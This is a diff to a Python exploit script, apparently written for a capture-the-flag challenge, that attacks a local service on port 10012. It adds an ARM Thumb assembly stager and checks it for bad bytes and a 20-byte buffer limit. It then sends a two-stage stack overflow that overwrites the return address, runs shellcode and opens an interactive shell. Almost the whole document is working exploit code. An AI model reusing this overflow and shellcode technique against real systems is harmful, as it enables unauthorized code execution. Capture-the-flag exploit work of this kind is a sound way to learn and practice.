@@ -1,3 +1,19 @@
+stager_asm = '''.section .text
+.global _start
+.ascii "%s"
+_start:
+    # 14c8:	2800      	cmp	r0, #0
+    mov r3, #0x14
+    lsl r3, #8
+    add r3, #0xc8
+    eor r4, r4
+    str r4, [r3]
+    # 00001400 <_start>:
+    mov r3, #0x14
+    lsl r3, #8
+    bx r3
+.ascii "%s"
+'''
 asm = '''.section .text
 .global _start
 
@@ -58,8 +74,23 @@ OBJDUMP = ARCH + '-elf-objdump'
 FLAG = 'flag.txt'
 BEGIN_MARKER = 'BEGIN_MARKER'
 END_MARKER = 'END_MARKER'
+BUF_SIZE = 20
 
+stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
 asm = asm % (BEGIN_MARKER, END_MARKER)
+
+open('/tmp/b.S', mode='wb').write(stager_asm)
+os.system(AS + ' /tmp/b.S -mthumb -mthumb-interwork -o /tmp/b.out')
+exe = open('/tmp/b.out').read()
+stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
+xxd(stager)
+if '\x00' in stager:
+    raise Exception('has \\x00')
+if '\x0a' in stager:
+    raise Exception('has \\x0a')
+if len(stager) > BUF_SIZE:
+    raise Exception('too long')
+stager = stager.ljust(BUF_SIZE, 'A')
 
 open('/tmp/a.S', mode='wb').write(asm)
 os.system(AS + ' /tmp/a.S -mthumb -mthumb-interwork -o /tmp/a.out')
@@ -72,8 +103,15 @@ xxd(shellcode)
 IP = '127.0.0.1'
 PORT = 10012
 s = mysock(IP, PORT)
-s.send('\n000')
+
+sl(s, '\n000')
+SP = 0x1b0c - BUF_SIZE - 4 + 1
+first = stager + p(SP)[0:2] + '\n'
+sl(s, first)
+
+sl(s, '\n000')
 SP = 0x1b0c + 1
-shellcode = 'AAAAAAAAAAAAAAAAAAAA' + p(SP) + shellcode + '\n'
+shellcode = 'A' * BUF_SIZE + p(SP) + shellcode + '\n'
 sl(s, shellcode)
+
 shell(s)
